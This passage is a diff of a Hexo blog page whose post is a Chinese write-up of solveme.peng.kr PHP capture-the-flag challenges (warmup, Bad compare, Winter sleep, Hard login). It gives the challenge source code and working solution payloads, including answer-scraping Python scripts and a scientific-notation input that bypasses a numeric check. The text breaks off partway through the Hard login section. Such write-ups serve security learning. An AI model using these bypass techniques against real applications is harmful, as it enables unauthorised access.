@@ -5,16 +5,16 @@
 
 
 
-<head><meta name="generator" content="Hexo 3.9.0">
+<head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
     <meta name="author" content="Ywc">
     <meta name="renderer" content="webkit">
     <meta name="copyright" content="Ywc">
     <meta name="keywords" content="Hexo | Ywc">
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     <title>PHP代码审计练习 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
@@ -68,10 +68,10 @@
 
 </style>
 
-    <link rel="preload" href="/css/style.css?v=201807017_1502" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="stylesheet" href="/css/mobile.css?v=20180709" media="(max-width: 980px)">
+    <link rel="preload" href= /css/style.css?v=201807017_1502 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180709 media="(max-width: 980px)">
     
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -180,12 +180,12 @@
 }( typeof global !== "undefined" ? global : this ) );
 </script>
 
-    <link rel="icon" href="/assets/ywc.ico">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js" as="script">
-    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
-    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    <link rel="icon" href= "/assets/ywc.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
     
     <!-- fancybox -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
@@ -193,7 +193,7 @@
     
     <!-- 谷歌统计  -->
     
-</head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
     
         <body class="post-body">
@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,495</span> / Reading time: <span class="post-count">8 min</span></span>
+                        <span>Word count: <span class="post-count">1.6k</span> / Reading time: <span class="post-count">8 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,16 +396,21 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="web1-warmup"><a href="#web1-warmup" class="headerlink" title="web1:warmup"></a>web1:warmup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-<p>题目给出字符串：1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</p>
-<p>payload1:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY="</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($str))));</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>payload2:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span></span><br><span class="line"><span class="keyword">print</span> s.decode(<span class="string">'base64'</span>).encode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p>
-<h2 id="web2-Bad-compare"><a href="#web2-Bad-compare" class="headerlink" title="web2:Bad compare"></a>web2:Bad compare</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'роВхУъесЧМ'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+        <h2 id="web1-warmup"><a href="#web1-warmup" class="headerlink" title="web1:warmup"></a>web1:warmup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$flag</span>)))), <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>题目给出字符串：1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D;</p>
+<p>payload1:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>))));</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload2:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&#x27;</span></span><br><span class="line"><span class="built_in">print</span> s.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)[::-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="web2-Bad-compare"><a href="#web2-Bad-compare" class="headerlink" title="web2:Bad compare"></a>web2:Bad compare</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>] === <span class="string">&#x27;роВхУъесЧМ&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Wrong answer&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 <p>问题在于роВхУъесЧМ这一串奇怪的字符安,直接复制不行，编码问题。</p>
-<p>payload1: burpsuit里看到要比较的内容的16进制编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://badcompare.solveme.peng.kr/index.php?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</span><br></pre></td></tr></table></figure></p>
-<p>payload2:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://badcompare.solveme.peng.kr/'</span></span><br><span class="line">rule = <span class="string">'===&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;\'(.+?)\'&lt;/span&gt;&lt;span style="color: #007700"&gt;'</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">result = re.findall(rule,r.content)</span><br><span class="line">result = <span class="string">''</span>.join(result)</span><br><span class="line">s = requests.get(<span class="string">'http://badcompare.solveme.peng.kr/?answer='</span>+urllib.quote(result))</span><br><span class="line"><span class="keyword">print</span> s.content</span><br></pre></td></tr></table></figure></p>
-<p>payload3:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line">__author__ = <span class="string">'ywc'</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">'http://badcompare.solveme.peng.kr/'</span></span><br><span class="line">    cont=requests.get(url).content</span><br><span class="line">    <span class="comment"># print cont</span></span><br><span class="line">    answer=re.findall(<span class="string">r"===&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;'(.*?)'&lt;/span&gt;"</span>,cont)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print answer</span></span><br><span class="line">    <span class="keyword">print</span> requests.get(url+<span class="string">'?answer='</span>+urllib.quote(answer)).content</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="web3-Winter-sleep"><a href="#web3-Winter-sleep" class="headerlink" title="web3:Winter sleep"></a>web3:Winter sleep</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>payload1: burpsuit里看到要比较的内容的16进制编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://badcompare.solveme.peng.kr/index.php?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</span><br></pre></td></tr></table></figure>
+<p>payload2:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://badcompare.solveme.peng.kr/&#x27;</span></span><br><span class="line">rule = <span class="string">&#x27;===&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;\&#x27;(.+?)\&#x27;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">result = re.findall(rule,r.content)</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line">s = requests.get(<span class="string">&#x27;http://badcompare.solveme.peng.kr/?answer=&#x27;</span>+urllib.quote(result))</span><br><span class="line"><span class="built_in">print</span> s.content</span><br></pre></td></tr></table></figure>
+<p>payload3:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;ywc&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    url=<span class="string">&#x27;http://badcompare.solveme.peng.kr/&#x27;</span></span><br><span class="line">    cont=requests.get(url).content</span><br><span class="line">    <span class="comment"># print cont</span></span><br><span class="line">    answer=re.findall(<span class="string">r&quot;===&amp;nbsp;&lt;/span&gt;&lt;span style=\&quot;color: #DD0000\&quot;&gt;&#x27;(.*?)&#x27;&lt;/span&gt;&quot;</span>,cont)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print answer</span></span><br><span class="line">    <span class="built_in">print</span> requests.get(url+<span class="string">&#x27;?answer=&#x27;</span>+urllib.quote(answer)).content</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="web3-Winter-sleep"><a href="#web3-Winter-sleep" class="headerlink" title="web3:Winter sleep"></a>web3:Winter sleep</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;The time must be number.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;This time is too short.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;This time is too long.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 <p>关键函数：</p>
 <ul>
 <li>is_numeric(): 检测变量是否为数字或数字字符串，支持科学计数法。</li>
@@ -414,41 +419,52 @@ height:50vh;
 </ul>
 <p>可见我们输入一个介于5184000~7776000直接的值即可拿到flag</p>
 <p>但实际上这样我们的浏览器会sleep大量时间，显然不可取，这时想到科学计数法。</p>
-<p>在php做如下实验：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 2 ,&apos;&lt;br&gt;&apos;;		//5184000</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 3,&apos;&lt;br&gt;&apos;	;	//7776000</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;123abc&apos; ,&apos;&lt;br&gt;&apos;;		//123</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;1abc23&apos; ,&apos;&lt;br&gt;&apos;;			//1</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;abc123&apos; ,&apos;&lt;br&gt;&apos;;			//0</span><br><span class="line">	</span><br><span class="line">	echo 6e6 ,&apos;&lt;br&gt;&apos;;		//6000000</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;6e6&apos;;		//6</span><br></pre></td></tr></table></figure></p>
+<p>在php做如下实验：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 2 ,&#x27;&lt;br&gt;&#x27;;		//5184000</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 3,&#x27;&lt;br&gt;&#x27;	;	//7776000</span><br><span class="line">	</span><br><span class="line">	echo (int)&#x27;123abc&#x27; ,&#x27;&lt;br&gt;&#x27;;		//123</span><br><span class="line">	</span><br><span class="line">	echo (int)&#x27;1abc23&#x27; ,&#x27;&lt;br&gt;&#x27;;			//1</span><br><span class="line">	</span><br><span class="line">	echo (int)&#x27;abc123&#x27; ,&#x27;&lt;br&gt;&#x27;;			//0</span><br><span class="line">	</span><br><span class="line">	echo 6e6 ,&#x27;&lt;br&gt;&#x27;;		//6000000</span><br><span class="line">	</span><br><span class="line">	echo (int)&#x27;6e6&#x27;;		//6</span><br></pre></td></tr></table></figure>
 <p>从上面代码可以看出，(int)将字符串转换成了int型，比如第三行，将123abc输出为123，第四行把1abc23输出为1。第五行把abc123输出为123</p>
 <p>所以这里我们可以用科学计数法，6e6这个刚好满足代码的逻辑。</p>
 <p>sleep也之执行6秒,当然也可以用其他的数字在5184000~777600之间，以科学计数法表示即可。</p>
-<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wintersleep.solveme.peng.kr/?time=6e6</span><br></pre></td></tr></table></figure></p>
-<h2 id="web4-Hard-login"><a href="#web4-Hard-login" class="headerlink" title="web4:Hard login"></a>web4:Hard login</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>], $_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'hard_login_check'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Already logged in..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]&#123;<span class="number">3</span>&#125;) || strtolower($_GET[<span class="string">'username'</span>]) != $hidden_username)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Wrong username..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]&#123;<span class="number">7</span>&#125;) || $_GET[<span class="string">'password'</span>] != $hidden_password)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Wrong password..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $_SESSION[<span class="string">'hard_login_check'</span>] = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login success!'</span>;</span><br><span class="line">            header(<span class="string">'Location: ./'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span 